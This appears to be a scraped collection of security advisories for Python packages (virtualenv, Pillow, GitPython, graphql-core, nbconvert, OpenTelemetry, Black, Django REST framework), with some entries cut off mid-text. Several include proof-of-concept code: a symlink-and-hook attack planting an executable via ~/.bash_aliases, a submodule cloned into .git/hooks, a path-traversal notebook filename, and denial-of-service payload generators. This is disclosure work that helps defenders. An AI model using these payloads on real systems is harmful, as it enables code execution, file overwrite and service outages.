items.title: [virtualenv] virtualenv: Generated files can follow existing destination links
items.summary: SummaryGenerated activation files and pyvenv.cfg can follow existing links and write outside the requested environment. Thetemplate writer tests exists() before unlinking, which misses dangling symlinks; the configuration writer opens theexisting path directly.Anthropic's OSS Scanner reported this as ANT-2026-XBEOCBS1 in virtualenv-20261015-005, received on 15 October 2026.Affected areaFinal file entries written during environment creation and seeding.Attacker-controlled inputAnother account must be able to prepare file links in the destination before creation. The invoking user must have writepermission at the linked target. The destination parent must remain controlled during creation; concurrentparent-directory replacement is a separate concern.Affected codeThe relevant 21.14.8 source is intemplate writer,configuration writer.MechanismViaTemplateActivator._generate() removes an existing output only when Path.exists() is true. A dangling symlinktherefore survives, and write_bytes() creates its target outside the environment. Other generated files have relatedfinal-entry behavior. PyEnvCfg.write() opens pyvenv.cfg without first replacing an existing link; a symlink or hardlink there can overwrite an existing target. These paths require a prepared destination tree and the invoking user'spermission to write the linked target.Reproduction and evidenceThe scanner's project tree contains venv/bin/activate -> ../../../.bash_aliases and an executable venv/bin/basename.Before creation, a new interactive bash does not create the marker. A plain virtualenv venv writes the activationscript through the dangling link, creating ~/.bash_aliases as a regular file. Debian's stock .bashrc sources thatfile; the next interactive bash adds venv/bin to PATH and the planted basename writes the marker. The reproducerchecks that the link remains, ~/.bash_aliases appears, and the second shell executes the planted file. A separatemanual check links pyvenv.cfg to ~/.bashrc and observes the latter replaced with generated configuration text.The link lets creation write outside the requested environment. The attacker chooses the target path but the generatedbytes come from virtualenv. The executable in the example was already in the prepared tree; this finding is notarbitrary code injection into an otherwise trusted destination. The scanner traces the template behavior to #1454, firstreleased in 20.0.0b1. PR #3431 replaces pre-existing output links anduses exclusive creation for generated text. It does not make a destination safe if another account can replace parentdirectories during creation.Attack sequencesequenceDiagram    participant A as Prepared project tree    participant V as virtualenv writer    participant H as User home    participant B as Next interactive bash    A->>V: venv/bin/activate links to missing ~/.bash_aliases    V->>V: Path.exists() follows link and returns false    V->>H: write activation bytes through link    H-->>B: ~/.bash_aliases now exists    B->>H: .bashrc sources ~/.bash_aliases    B->>A: PATH reaches planted venv/bin/basename    A-->>B: marker created    Note over V,H: pyvenv.cfg can also overwrite an existing linked targetReproducer filesThe following files are from the scanner report for ANT-2026-XBEOCBS1. They were tested against commit a857a7823c73in the scanner image. The repro entrypoint expects companion files under /tmp/repro.d; cases that change user IDsneed a disposable root-capable container. The last output line is BUG when the reported behavior occurs. These filesare included as evidence and were not rerun for this advisory update.repro#!/usr/bin/env python3import osimport shutilimport subprocessimport sysimport tempfile# set up: a fresh home with Debian's stock ~/.bashrc, which sources ~/.bash_aliases when that file existshome = tempfile.mkdtemp(prefix="home-")shutil.copy("/etc/skel/.bashrc", f"{home}/.bashrc")bash_aliases = f"{home}/.bash_aliases"marker = f"{home}/attacker-ran"open_terminal = ["bash", "-i", "-c", "true"]terminal_env = {"HOME": home, "PATH": "/usr/bin:/bin", "TERM": "dumb"}# the attacker's repository, cloned by the user to ~/projcheckout = f"{home}/proj"subprocess.run([sys.executable, "/tmp/repro.d/make_hostile_checkout.py", checkout], check=True)activate = f"{checkout}/venv/bin/activate"print("shipped: venv/bin/activate ->", os.readlink(activate), flush=True)# a terminal opened before virtualenv runs does not touch the checkout (stderr: bash -i without a tty warns)subprocess.run(open_terminal, env=terminal_env, stderr=subprocess.DEVNULL, check=True)print("before virtualenv: ~/.bash_aliases exists:", os.path.lexists(bash_aliases), "| marker exists:", os.path.exists(marker), flush=True)assert not os.path.lexists(bash_aliases) and not os.path.exists(marker)# trigger: the user creates an environment in the checkout, then opens a new terminalsubprocess.run(["virtualenv", "--no-periodic-update", "venv"], cwd=checkout, env={**os.environ, "HOME": home}, check=True)subprocess.run(o

items.title: [pillow] Pillow: Bundled libopenjp2 2.5.4 in all wheels since 11.1.0 carries OSV-2025-219 heap-buffer-overflow write reachable from Image.open().load()
items.summary: SummaryEvery Pillow wheel from 11.1.0 onward bundles a libopenjp2 containing a heap-buffer-overflow write that is fixed upstream on master but has never appeared in an OpenJPEG release. See https://osv.dev/vulnerability/OSV-2025-219Because the wheel bundles its own copy, a patched host OS does not help. It is reachable from Image.open(fp); im.load() with default settings.I am reporting it here rather than only upstream because Pillow is where the vulnerable binary actually reaches users.Note the inversion that makes this easy to miss: OpenJPEG 2.5.2 and earlier are safe. The bug was introduced in 954c6e3c (2024-06-25), so keeping the dependency current is what creates the exposure.DetailsAffected wheelsFrom .github/dependencies.json (openjpeg) at each tag:Pillowbundled OpenJPEGstatus10.4.02.5.2safe11.0.02.5.2safe11.1.0, 11.2.1, 11.3.02.5.3affected12.0.0 … 12.3.02.5.4affectedConfirmed on an installed wheel: PIL.features.version_codec('jpg_2000') → 2.5.4, bundled file pillow.libs/libopenjp2-*.so.2.5.4. main still pins 2.5.4 as of 2026-10-06.The defectsrc/lib/openjp2/j2k.c, in opj_j2k_read_sod:OPJ_UINT32 l_current_tile_part =    l_cstr_index->tile_index[p_j2k->m_current_tile_number].current_tpsno;l_cstr_index->tile_index[...].tp_index[l_current_tile_part].end_header = l_current_pos;l_cstr_index->tile_index[...].tp_index[l_current_tile_part].end_pos   =    l_current_pos + p_j2k->m_specific_param.m_decoder.m_sot_length + 2;tp_index is neither null-checked nor bounds-checked, and l_current_tile_part comes directly from the one-byte TPsot field of the SOT marker.The correct guard already exists a few lines later in opj_j2k_add_tlmarker (j2k.c:8459), writing the same array at the same index behind if (tp_index && l_current_tile_part < nb_tps). One writer checked, its sibling not.Reached by giving the codestream a valid TLM marker — so tp_index is allocated once by opj_j2k_build_tp_index_from_tlm, sized to the TLM entry count, and opj_j2k_read_sot then skips all resizing — while setting TNsot = 0 in every SOT, which keeps the TLM "valid" and lets TPsot walk past the allocation.Patch statusFixed upstream in 91d08b11 ("Fix heap buffer overlfow in opj_j2k_read_sod", 2026-02-10).The newest OpenJPEG tag is v2.5.4 (2025-09-20), and compare/v2.5.4...91d08b11 reports ahead 6, behind 0 — the fix is in no release, 8 months on.Suggested remediationCarry 91d08b11 as a patch in the wheel build until an OpenJPEG release includes it — three lines, identical to a guard already present in the same file.Consider asking OpenJPEG to cut a release; they have had an unreleased memory-corruption fix on master since February 2026, and every distro is shipping the vulnerable code.Your security handbook already tells applications to block EPS at the application layer. A similarly explicit note that Image.open() ignores filename/Content-Type and will reach any compiled-in codec unless formats= is passed would help downstream apps a lot.Not a Pillow bug, but relevant: the extension allowlist most apps rely on does not applyImage.open() sniffs magic bytes, so a JPEG 2000 codestream in a file named avatar.png declared Content-Type: image/png reaches the JP2 decoder anyway.I verified this against a production service documenting PNG/JPEG-only uploads: it accepted and fully decoded a JP2 through exactly that path, with 16 formats reachable from one upload endpoint against 43 registered openers. That service has since fixed it by passing formats= and validating on the detected format rather than the client's Content-Type.That is the reason a decoder-level issue like this one has much wider reach than downstream maintainers tend to assume.Proof of conceptASan build of OpenJPEG 2.5.4 interposed under a stock Pillow 12.3.0, running Image.open(p); im.load():==766332==ERROR: AddressSanitizer: heap-buffer-overflowWRITE of size 8    #0 opj_j2k_read_sod          j2k.c:5086    #1 opj_j2k_read_tile_header  j2k.c:9912    #2 opj_read_tile_header      openjpeg.c:575    #3 j2k_decode_entry          src/libImaging/Jpeg2KDecode.c:793    #4 ImagingJpeg2KDecode       src/libImaging/Jpeg2KDecode.c:949    #5 _decode                   src/decode.c:132located 8 bytes to the right of a 24-byte region allocated by    opj_j2k_build_tp_index_from_tlm j2k.c:8939Frames 3–5 are Pillow's own decoder, not a synthetic harness. No non-default decoder options are involved; strict mode is on, which is Pillow's behaviour since Pillow never calls opj_decoder_set_strict_mode. A benign twin image runs the same path cleanly and returns a valid image, so this is the payload and not a parse failure.I have deliberately not attached the PoC file to this initial report. I'm happy to attach the PoC, the builder script and the RIP-control harness here on request, or hold everything until a fix is ready.No disclosure deadline from me; I will not publish anything while this is being worked on.ImpactAny application that calls Image.open() / im.load() on an image it did not produce — the overwhelmi

items.title: [pypdf] pypdf: Possible long runtimes/large memory usage when retrieving form fields
items.summary: ImpactAn attacker who uses this vulnerability can craft a PDF which leads to large memory usage and/or long runtimes. items.title: [Gitpython] GitPython validates a submodule's ".git" path only after cloning into it (RCE)
items.summary: Summarycreate_submodule(name, path, url) clones a submodule into the repo's own .gitdirectory before it rejects the path. A path of ".git/hooks" is accepted by thepre-clone check, so the submodule is cloned straight into the live hooks directory,and a file named post-checkout in the submodule becomes an executable.git/hooks/post-checkout. On 3.2.0+ the later index check does raise ValueError,but only after the clone already wrote to disk, and it does not remove the plantedhook; on 3.1.x there is no such check and the call succeeds silently. Either way thehook runs on the next git operation (e.g. checkout), giving code execution.DetailsThe checkout path is validated too late, after the clone has already mutated disk.This breaks the "validate before mutation" invariant that commit 43a43cd8 ("Validatesubmodule checkout and metadata paths before mutation") set out to enforce.Submodule.add() calls the permissive path check before cloning, and the strict checkonly reaches the ".git" alias at index time, after _clone_repo has written to disk:git/objects/submodule/base.py (Submodule.add)  599: path = cls._to_relative_path(repo, path)           # accepts ".git/hooks"  673: mrepo = cls._clone_repo(repo, url, path, name, ...) # clones into /.git/hooks  714: index.add([sm], write=True)                         # strict check only triggers heregit/index/base.py (IndexFile._preprocess_add_items)  732: _validate_repo_path(entry.path)                     # rejects ".git", too late_to_relative_path only blocks ../absolute/out-of-tree paths; .git aliases arerejected only by _validate_repo_path, which was added in 3.2.0 (commit a75aedf3) andruns at the index boundary. The ValueError it raises at line 732 does not roll backwhat _clone_repo already wrote.Version-dependent behavior:3.2.0 .. tip bda18e08: _validate_repo_path raises ValueError at index.add, but thehook is already on disk and is not removed (incorrect order of validation vs. clone).3.1.x (e.g. 3.1.59): _validate_repo_path does not exist and _to_relative_path doesnot reject .git; create_submodule(path=".git/hooks", ...) returns with no error atall and the hook is planted silently.Proof of conceptSetup:  evilsub/ : a git repo whose ROOT contains an executable file named post-checkout (the payload)  victim/  : a git repo with at least 1 commit and a second branch, whose .git/hooks has NO             sample hooks (the state of a minimal/CI checkout, or git init with an empty             template dir, or GIT_TEMPLATE_DIR/init.templateDir empty)import git, os.path as osptry:    git.Repo("victim").create_submodule(name="x", path=".git/hooks", url=osp.abspath("evilsub"))except ValueError:    pass   # 3.2.0+: ".git" is rejected, but only AFTER the clone, so the plant already happened.           # 3.1.x: no exception is raised at all; the call succeeds and still plants the hook.victim/.git/hooks/post-checkout now exists, mode 0755, attacker-controlled, on everyaffected version. Any later checkout runs it:git -C victim checkout    ->   the hook runs   ->   code executionVerified live:tip bda18e08 (3.2.0 + 3 commits): create_submodule raised ValueError fromgit/index/base.py:732, yet .git/hooks/post-checkout was present and executable, andgit checkout executed it.3.1.59: create_submodule returned with no error; .git/hooks/post-checkout was plantedand executed by git checkout.ImpactArbitrary code execution. A library/app that creates a submodule from anattacker-influenced path ends up with an attacker-controlled executable in.git/hooks, which git runs on ordinary later operations. This affects any servicethat derives a submodule checkout path from untrusted data, e.g. one that ingests asubmodule spec (name/path/url) from a user-supplied manifest or API request and feedspath into create_submodule. On 3.2.0+ the library's own validation is the thing thatfails: it correctly rejects the .git path, but only after the submodule has alreadybeen cloned into place, so an app that traps the ValueError reasonably believes theunsafe path was blocked.Preconditions (hence AC:H): (1) the app passes an attacker-influenced submodule path;(2) the target hook name is free in .git/hooks, true for minimal/CI/containercheckouts and whenever init.templateDir/GIT_TEMPLATE_DIR is empty. With the defaultsample hooks present, git clone refuses the non-empty destination and no plant occurs.Affected: all tested versions from 3.1.x (3.1.59) through the current tip bda18e08(3.2.0 + 3 commits). 3.1.x plants silently; 3.2.0+ plants despite raising ValueError.Referenceshttps://github.com/gitpython-developers/GitPython/security/advisories/GHSA-83vg-56qc-22m7https://nvd.nist.gov/vuln/detail/CVE-2026-114145https://github.com/gitpython-developers/GitPython/pull/2264https://github.com/gitpython-developers/GitPython/commit/97eadb888d2f99567e3113f4e455be4ca128f697https://github.com/gitpython-developers/GitPython/releases/tag/3.2.1https://github.com/advisories/GHSA-83vg-56qc-22m7

items.title: [graphql-core] GraphQL-core: Denial of service via comment tokens bypassing the parser's max_tokens limit
items.summary:
SummaryThe parser's max_tokens limit — the documented defence against oversized GraphQLdocuments — did not count comment tokens. A document padded with comments couldtherefore pass a max_tokens check of any size while still allocating one Tokenobject per comment, all of which stay reachable for the lifetime of the parseddocument. A 38 MB comment-padded payload allocated roughly 92 MB of additionalresident memory with max_tokens=5 in force.DetailsLexer.lookahead() reads tokens one at a time and skips over comments, returning onlythe first non-comment token. Each skipped comment is nevertheless fully tokenized,allocated as a Token object, and linked into the persistent token list viatoken.next / token.prev — the chain that powers source-location reporting, andwhich is retained as long as the document is.Parser.advance_lexer() incremented the token counter only for the tokens the lexeractually returned. Comments were therefore invisible to the accounting, andmax_tokens bounded only the non-comment tokens.The practical consequence is a gap between what users reasonably believe max_tokensprotects and what it did protect. The limit was not broken for ordinary documents —real tokens were still capped correctly — so the shortfall was not observable withoutspecifically testing comment padding.As with the companion issue, the payload compresses extremely well (# c
 repeated),so body-size limits and WAF inspection applied to the compressed request do not seeits true size, while the framework decompresses it in memory before the parser isreached.Proof of conceptimport gcimport resourcefrom graphql import parse# 100,000 comments, a 5-token query, and max_tokens=5 — accepted.query = "# c
" * 100_000 + "{ a }"parse(query, max_tokens=5)          # no error raised# Memory amplification.big = "# padding comment used to amplify memory per token
" * 500_000 + "{ a }"gc.collect()before = resource.getrusage(resource.RUSAGE_SELF).ru_maxrssparse(big, max_tokens=5)            # ~38 MB sourceafter = resource.getrusage(resource.RUSAGE_SELF).ru_maxrssprint(f"RSS delta: +{(after - before) / 1024:.0f} MB")Measured on GraphQL-core 3.2.8 / CPython 3.12 / Linux x86_64: the 391 KB payloadparsed in 127 ms, and the 38.1 MB payload produced an RSS delta of +92 MB — about2.4× the source size, on top of the source string itself.ImpactDenial of service through memory exhaustion. A modest number of concurrent requestscan push a worker past a typical 256 MB or 512 MB container limit and trigger anOOM kill. No authentication is required, and no data is disclosed or modified.Depth limiters and complexity analyzers do not help: they run on the AST after parsinghas already succeeded, and the document contains only five real tokens.PatchesFixed in 3.2.12 and 3.3.0rc1.Parser.advance_lexer now counts every token consumed, including the comment tokensthe lexer skips between the previously focused token and the new one, and includingthe advance onto EOF so that trailing comments are covered. max_tokens therefore nowbounds every Token the parser allocates.Note the behaviour change: comments now count toward max_tokens. Acomment-heavy document that was previously accepted may now be rejected. If you parsedocuments containing substantial comments — SDL files with documentation comments, forinstance — and you set max_tokens, you may need to raise the limit. Thetoken_count attribute of a parsed document likewise now includes comments.WorkaroundsIf you cannot upgrade, apply a request body-size limit to the decompressed bodybefore the document reaches parse().Such a limit is worth keeping after upgrading as well: max_tokens is one guard amongseveral and bounds the token count, not the overall cost of a request.ReferencesGraphQL specification § 2.1.4 — CommentsCreditsReported by @BZHunt, who also reviewed the fixesbefore release. In memory of ZaX, who was the driving force behind this discovery.Referenceshttps://github.com/graphql-python/graphql-core/security/advisories/GHSA-r77w-qph3-7vf8https://github.com/graphql-python/graphql-core/commit/437dea102e92fdf05a2971ca76787c5a5bad875ahttps://github.com/graphql-python/graphql-core/commit/80ef435a1808fbbcc4aaac63ae76771a1c91002dhttps://github.com/graphql-python/graphql-core/releases/tag/v3.2.12https://github.com/graphql-python/graphql-core/releases/tag/v3.3.0rc1https://github.com/advisories/GHSA-r77w-qph3-7vf8

items.title: [graphql-core] GraphQL-core: Denial of service via quadratic complexity in the OverlappingFieldsCanBeMerged validation rule
items.summary: SummaryThe OverlappingFieldsCanBeMerged validation rule can be driven into quadratic — andin the worst case O(n²·m²) — running time by a small, highly compressible query. Asingle 364 KB document can occupy one CPU core for over five minutes duringvalidation, before any resolver runs. Because the rule is part of specified_rulesand therefore enabled by default, every GraphQL-core based server is affected atdefault settings.DetailsOverlappingFieldsCanBeMerged compares every pair of fields that share a responsename and recurses into their sub-selections. The memoization added forCVE-2023-26144 (GHSA-9pv7-vfvm-6vr7) is keyed by named fragment identity, so itdoes not cover this path: inline fragments are flattened into the parent selectionset before the cache is consulted, and therefore every pair is re-compared fromscratch at every nesting level.Repeating an inline fragment that selects the same response name at two nestinglevels multiplies the two effects. There was no comparison budget and no validationtimeout, so the rule ran to completion regardless of cost.The cost is incurred in the validation phase, which is what makes this hard todefend against from outside the library: query-depth limiters, complexity analyzersand cost estimators all operate on the parsed document after validation, and themalicious document is trivially shallow (depth 3, complexity 1). The payload is alsoone short string repeated many times, so it compresses to a few kilobytes and slipspast body-size limits and WAF inspection that only see the compressed request.Proof of conceptimport timefrom graphql import build_schema, parse, validateschema = build_schema(    "type Query { field: Node } type Node { f: Node, g: Node, x: String }")def gen(n: int, m: int) -> str:    inner = " ".join(["... on Node { x }"] * m)    outer = " ".join([f"... on Node {{ f {{ {inner} }} }}"] * n)    return f"{{ field {{ {outer} }} }}"query = gen(200, 100)          # 364 KB, gzips to a few KBdocument = parse(query)start = time.perf_counter()validate(schema, document)      # returns no errors — it just burns CPUprint(f"{(time.perf_counter() - start):.0f}s")Measured on GraphQL-core 3.2.8 / CPython 3.12 / Linux x86_64:nmquery sizevalidation time20207.6 KB0.16 s505046 KB5.2 s100100182 KB81 s200100364 KB319 sDoubling n at fixed m quadruples the time, as expected for a quadratic outer loopdriving a quadratic inner walk.ImpactDenial of service. One request pins one worker process for minutes; because CPythonholds the GIL for this pure-CPU work, a handful of concurrent requests can saturate atypical multi-worker deployment. No authentication is required, and no data isdisclosed or modified.PatchesFixed in 3.2.12 and 3.3.0rc1.Validation now enforces a per-document comparison budget. OnceMAX_FIELD_COMPARISONS (default 250_000) pairwise comparisons have been made, therule aborts and reports a GraphQLError instead of running to completion:Query is too complex to validate for overlapping fields: exceeded 250000 fieldcomparisons. Validation was aborted.The default is far above what any realistic query reaches. It is a module-levelconstant and can be raised or lowered:from graphql.validation.rules import overlapping_fields_can_be_mergedoverlapping_fields_can_be_merged.MAX_FIELD_COMPARISONS = 1_000_000Note the behaviour change: a pathological query that previously validated — slowly —now produces a validation error.WorkaroundsIf you cannot upgrade, reject oversized documents before they reach validate().Note that a request body-size limit must be applied to the decompressed body to beeffective here, since the payload is highly compressible. RemovingOverlappingFieldsCanBeMergedRule from the rule set is not a safe workaround: it isa correctness rule required by the specification.A body-size limit remains worthwhile after upgrading — the comparison budget boundsthis specific rule, not overall request cost.CreditsReported by @BZHunt, who also reviewed the fixesbefore release. In memory of ZaX, who was the driving force behind this discovery.Independently found and diagnosed by @bcmyguest, whoalso proposed a fix.Referenceshttps://github.com/graphql-python/graphql-core/security/advisories/GHSA-vj8h-fx38-h3vchttps://github.com/graphql-python/graphql-core/commit/150e59814d97d12140be005a558c93188ef89198https://github.com/graphql-python/graphql-core/commit/29c2753a7ee30a96a4109e7c6add1a2dae0497d7https://github.com/graphql-python/graphql-core/releases/tag/v3.2.12https://github.com/graphql-python/graphql-core/releases/tag/v3.3.0rc1https://github.com/advisories/GHSA-vj8h-fx38-h3vc

items.title: [nbconvert] nbconvert: Arbitrary file write through path traversal in cell output filenames when exporting to md, latex, rst and asciidoc
items.summary: Summarynbconvert <= v7.17.1 has an arbitrary file write vulnerability due to a path traversal in ipynb cell output metadata, more specifically on the filename attribute.Vulnerable converters : --to markdown, --to latex, --to rst, --to asciidoc.In ExtractOutputPreprocessor, extractoutput.py:116-119 joins attacker-controlled  path to output_files_dir with no canonicalization check, enabling arbitrary file write.This is a sibling vulnerability of https://github.com/advisories/GHSA-4c99-qj7h-p3vg.ImpactIf a victim runs nbconvert on a malicious ipynb file, it can create some files with arbitrary data in arbitrary locations, i.e. override authorized_keys.Note that running the cell with jupyter overrides the output, so it would "clean up" malicious cells.PoCIn a ipynb file:"cells": [{        "cell_type": "code", "id": "abc123", "execution_count": 1,        "metadata": {}, "source": "# PoC",        "outputs": [{            "output_type": "display_data",            "metadata": {                "filename": "../../../tmp/PWNED.png"  # ← traverses outside output_dir            },            "data": {                # minimal valid PNG (1×1 pixel)                "image/png": "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="            }        }]    }]PatchesFixed in https://github.com/jupyter/nbconvert/commit/ce4bd99aec31d81d759fa8eeb8643179392ec66f7.17.2Referenceshttps://github.com/jupyter/nbconvert/security/advisories/GHSA-pjvx-prjx-h659https://nvd.nist.gov/vuln/detail/CVE-2026-114140https://github.com/jupyter/nbconvert/commit/ce4bd99aec31d81d759fa8eeb8643179392ec66fhttps://github.com/jupyter/nbconvert/releases/tag/v7.17.2https://github.com/advisories/GHSA-pjvx-prjx-h659

items.title: [opentelemetry-api] OpenTelemetry Python: Unbounded tracestate parsing in opentelemetry-api
items.summary: SummaryTraceState.from_header splits the inbound W3C tracestate header with a regular expression that starts with an unbounded optional-whitespace run, and no length limit is applied first. A run of spaces or tabs that is not followed by a comma costs O(N²) CPU. A single unauthenticated request with a ~100 KB tracestate keeps the handling worker busy for ~6 s (spaces) to ~12 s (tabs); under an asyncio server it blocks every other connection for that time.Affected component / versionPackage: opentelemetry-api (pip) — opentelemetry/trace/span.py (TraceState.from_header), reached from opentelemetry/trace/propagation/tracecontext.py (TraceContextTextMapPropagator.extract).Confirmed in main (5e8083e8) and in the v1.44.0 and v1.45.0 tags; the same pattern is present back to v1.0.0 (introduced by #1599, March 2021). Not exhaustively verified against every release in between.Reachable with the default propagators (OTEL_PROPAGATORS defaults to tracecontext,baggage) from any server instrumentation that calls propagate.extract(), for example opentelemetry-instrumentation-asgi.DetailsThe header reaches the parser without any length check:# opentelemetry-api/src/opentelemetry/trace/propagation/tracecontext.py:57tracestate_headers = getter.get(carrier, self._TRACESTATE_HEADER_NAME)  # <-- attacker-controlled request header(s), any sizeif tracestate_headers is None:    tracestate = Noneelse:    tracestate = TraceState.from_header(tracestate_headers)             # <-- no length check before parsing (line 61)The split pattern and the parser:# opentelemetry-api/src/opentelemetry/trace/span.py:45_TRACECONTEXT_MAXIMUM_TRACESTATE_KEYS = 32            # <-- only enforced later, in TraceState.__init__, after the split_delimiter_pattern = re.compile(r"[ \t]*,[ \t]*")      # <-- (line 46) starts with an unbounded [ \t]*# span.py:382@classmethoddef from_header(cls, header_list: list[str]) -> TraceState:    pairs = {}  # type: dict[str, str]    for header in header_list:        members: list[str] = re.split(_delimiter_pattern, header)   # <-- (line 400) VULNERABLE: O(N^2) on "a=b" + " " * N + "x"        for member in members:            if not member:                continue            match = _member_pattern.fullmatch(member)            if not match:                _logger.warning(                                    # <-- also logs the entire malformed member (up to the whole header)                    "Member doesn't match the w3c identifiers format %s",                    member,                )                return cls()            ...re.split tries the pattern at every offset. At each offset inside a whitespace run, [ \t]* consumes the rest of the run, finds no ,, backtracks and fails, then the engine moves one character forward and repeats. N characters × up to N steps each = O(N²). The 32-member limit never gets a chance to run because split has to finish first.The sibling propagator already has the missing guard:# baggage/propagation/__init__.py:68_MAX_HEADER_LENGTH = 8192...if len(header.encode()) > self._MAX_HEADER_LENGTH:   # <-- (line 93) rejected before any regex runs; tracestate has no equivalent    _logger.warning(...)    return contextA 16 KiB header costs ≈ 0.25 s and an 8 KiB header ≈ 0.07 s.Measured cost of extract() on one core (valid traceparent, tracestate: "a=b" + N spaces + "x"): the time quadruples each time N doubles (see the proof of concept). Roughly 0.06 s at 10,000 characters, 1 s at 40,000, 4 s at 80,000, 9 s at 100,000 (tabs are about 1.6× slower). Whether a server lets such a header through (header-size limits, tested): gunicorn rejects ≥ 8190 bytes (response code 431); uvicorn --http h11 rejects above 16 KiB (400); waitress accepts up to 256 KiB (200 KB accepted, 300 KB rejected); uvicorn --http httptools — the default parser with uvicorn[standard] — accepted 300 KB, 1 MB, 5 MB and 20 MB tracestate headers.Proof of conceptA. Show the quadratic cost (no server needed)Install the API: pip install opentelemetry-api (any version from 1.0 up to the current main is affected).Save as poc_tracestate.py:import loggingimport timefrom opentelemetry.trace.propagation.tracecontext import TraceContextTextMapPropagator# The library logs the whole malformed member at WARNING; silence it so the timings stay readable.logging.disable(logging.CRITICAL)TRACEPARENT = "00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01"propagator = TraceContextTextMapPropagator()previous = Nonefor n in (10_000, 20_000, 40_000, 80_000):    # N spaces after a valid member, no comma anywhere in the header    carrier = {"traceparent": TRACEPARENT, "tracestate": "a=b" + " " * n + "x"}    start = time.perf_counter()    propagator.extract(carrier)    elapsed = time.perf_counter() - start    growth = f"x{elapsed / previous:.1f}" if previous else "-"    print(f"{n:>7} characters  {elapsed:6.2f} s  growth when size doubles: {growth}")    previous = elapsedRun python poc_tracestate.py.What to observe: the time grows by about ×4 every time the

items.title: [black] Black: GitHub Action installs unvalidated required-version from pyproject.toml
items.summary: SummaryThe GitHub Action bundled with Black can read the version from tool.black.required-version if use_pyproject is set to True. This version is not validated and therefore can be used to execute untrusted code in the context of a victim's repository.DetailsThis is similar to the previous CVE-2026-31900. The value in tool.black.required-version is accepted as the version to be installed by the action without validation.Proof of conceptReproduction requires a victim to use Black's GitHub Action with use_pyproject: true. The attacker would then issue a PR to the victim's repository with pyproject.toml edited so that Black points to a malicious repository.ImpactThis is a remote code execution vulnerability impacting users using the GitHub Action bundled with psf/black and using the use_pyproject: true setting.Referenceshttps://github.com/psf/black/security/advisories/GHSA-cg8m-r9f2-5wm2https://github.com/psf/black/pull/5510https://github.com/psf/black/commit/ac1f71563aeccf73cf13ece00f231d9d6c66a514https://github.com/psf/black/releases/tag/26.10.1https://github.com/advisories/GHSA-cg8m-r9f2-5wm2

items.title: [djangorestframework] Django REST framework: TokenProxy.delete() reports success and revokes nothing
items.summary: SummaryDeleting an authentication token through TokenProxy silently deletes nothing. The call raises noexception and reports success, the database row survives, and the token keeps authenticating. Anyapplication, admin integration or operational script that revokes credentials by calling .delete()on a TokenProxy instance believes it has revoked a token that is still live.DetailsTokenProxy overrides pk to return the user id (rest_framework/authtoken/models.py:49-63):@propertydef pk(self):    return self.user_idThe concrete Token model keys on key, not on an integer id. Model.delete() builds its deletequery from pk, so it emits:DELETE FROM "authtoken_token" WHERE "authtoken_token"."key" IN ('1')That matches a user id against the 40-character key column. Nothing matches, nothing raises, and thecall returns (0, {'authtoken.TokenProxy': 0}).DRF already ships two workarounds for this same identity mismatch instead of a fix. Inrest_framework/authtoken/admin.py, TokenAdmin.delete_model re-fetches the concrete row:def delete_model(self, request, obj):    Token.objects.get(key=obj.key).delete()   # admin.py:30and TokenAdmin sets actions = None with the comment "Actions not compatible with mapped IDs"(admin.py:50-53). The shipped admin path is therefore safe, and every other caller ofTokenProxy.delete() is not. Nothing in the API signals the difference.TokenProxy was added by e2bd3b6a (PR #7341, "Adjusted token admin to map to user ID"), firstreleased in 3.12.0.A fix would drop the pk override, or give TokenProxy a delete() that operates on the concreterow, or raise instead of silently reporting zero deletions.PoCSave as poc_tokenproxy_revocation.py and run it.#!/usr/bin/env python"""django-rest-framework: TokenProxy.delete() reports success and revokes nothing.  baseline  token exists                        -> 200  TRIGGER   TokenProxy.objects.get(...).delete() -> no exception, row survives, still 200  CONTROL   Token.objects.get(key=...).delete()  -> row gone, 401The control is what makes the trigger meaningful: it proves the row wasdeletable and the credential check live, so the 200 after the proxy delete is afailed revocation and not a broken harness.Requires: django, djangorestframework importable. No arguments.    python poc_tokenproxy_revocation.pyExit status 0 means the revocation failure reproduced."""import sysimport djangofrom django.conf import settingssettings.configure(    DEBUG=False,    SECRET_KEY="poc",    ALLOWED_HOSTS=["*"],    ROOT_URLCONF=__name__,    INSTALLED_APPS=[        "django.contrib.contenttypes",        "django.contrib.auth",        "rest_framework",        "rest_framework.authtoken",    ],    DATABASES={"default": {"ENGINE": "django.db.backends.sqlite3", "NAME": ":memory:"}},    DEFAULT_AUTO_FIELD="django.db.models.AutoField",    USE_TZ=True,)django.setup()from django.contrib.auth import get_user_model  # noqa: E402from django.core.management import call_command  # noqa: E402from django.db import connection  # noqa: E402from django.test import Client  # noqa: E402from django.test.utils import CaptureQueriesContext  # noqa: E402from django.urls import path  # noqa: E402from rest_framework.authentication import TokenAuthentication  # noqa: E402from rest_framework.authtoken.models import Token, TokenProxy  # noqa: E402from rest_framework.permissions import IsAuthenticated  # noqa: E402from rest_framework.response import Response  # noqa: E402from rest_framework.views import APIView  # noqa: E402class Whoami(APIView):    authentication_classes = [TokenAuthentication]    permission_classes = [IsAuthenticated]    def get(self, request):        return Response({"user": request.user.get_username()})urlpatterns = [path("", Whoami.as_view())]def probe(client, key):    response = client.get("/", headers={"authorization": "Token %s" % key})    return response.status_codedef main():    call_command("migrate", run_syncdb=True, verbosity=0)    user = get_user_model().objects.create_user(username="revoke-user", password="pw")    key = Token.objects.create(user=user).key    client = Client()    print("TokenProxy._meta.proxy   =", TokenProxy._meta.proxy)    print("Token._meta.pk.attname   =", Token._meta.pk.attname)    print("user.pk                  =", user.pk)    print("token key                =", key)    print("\n--- baseline")    print("rows                     =", Token.objects.count())    baseline = probe(client, key)    print("GET / with token         ->", baseline)    print("\n--- TRIGGER: delete through the proxy")    proxy = TokenProxy.objects.get(user=user)    print("proxy.pk                 =", proxy.pk, "(TokenProxy.pk property)")    raised = None    with CaptureQueriesContext(connection) as ctx:        try:            returned = proxy.delete()        except Exception as exc:  # noqa: BLE001            raised, returned = exc, None    for q in ctx.captured_queries:        if "DELETE" in q["sql"]:            print("    SQL:", q["sql"])    print("raised                   =", repr(raised))    p

items.title: [djangorestframework] Django REST framework: Accept header with many large quoted parameters burns ~19s of CPU per request in content negotiation
